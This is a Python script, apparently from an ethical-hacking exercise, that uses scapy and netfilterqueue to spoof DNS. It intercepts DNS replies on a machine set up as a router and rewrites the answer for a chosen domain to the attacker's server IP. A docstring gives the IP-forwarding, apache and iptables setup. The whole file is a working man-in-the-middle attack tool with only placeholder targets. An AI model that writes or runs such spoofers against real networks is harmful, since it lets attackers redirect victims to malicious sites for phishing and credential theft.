#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

""" 
    works in python 2 or 3

    configure computer as router
        echo 1 > /proc/sys/net/ipv4/ip_forward
    start server
        service apache2 start
    set up firewall rules using 
        iptables -I OUTPUT -j NFQUEUE --queue-num 0
        iptables -I INPUT -j NFQUEUE --queue-num 0
    delete tables
        iptables --flush
"""
# survey and create DNS responses
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        # grab domain name
        qname = scapy_packet[scapy.DNSQR].qname
        if "type url of desired website" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="type IP of your server")
            # create response 
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # delete response check(checksum and length of packet) 
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
# bind queue of responses to your ip table
queue.bind(0, process_packet)
# use call back and table 
queue.run()
